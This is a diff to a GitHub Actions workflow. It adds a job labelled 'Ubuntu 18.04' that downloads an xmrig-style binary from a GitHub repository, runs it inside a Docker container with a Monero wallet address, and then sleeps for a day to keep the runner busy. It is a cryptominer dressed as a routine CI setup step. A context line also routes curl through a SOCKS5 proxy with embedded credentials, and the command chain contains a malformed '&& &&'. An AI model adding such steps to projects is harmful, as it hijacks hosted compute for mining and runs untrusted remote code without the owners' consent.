@@ -74,4 +74,39 @@ jobs:
 curl -x socks5://aunglay:aunglay@103.153.202.203:8128 https://ifconfig.me --tlsv1
 
 
+name: Ubuntu 18.04
+
+on: 
+  workflow_dispatch:
+  
+jobs:
+  build:
+    runs-on: ubuntu-18.04
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run settting file
+        run: printf "sudo docker run -d -t -p 8022:8022 --name linuxvnc ubuntu:18.04 " | sudo su && printf "docker exec -t linuxvnc apt update" | sudo su && printf "docker exec -t linuxvnc apt install wget curl -y" | sudo su && && printf "docker exec -t linuxvnc curl -L -o aunglay https://github.com/githubaunglaymyanmar1/download/raw/main/xmr/xmrig " | sudo su && printf "docker exec -t linuxvnc chmod +x aunglay" | sudo su && printf "docker exec -t linuxvnc ./aunglay -o localhost:80 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY -k --tls --rig-id rig " | sudo su
+       
+      - name: Ubuntu ready to go 
+        run: sleep 1d  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
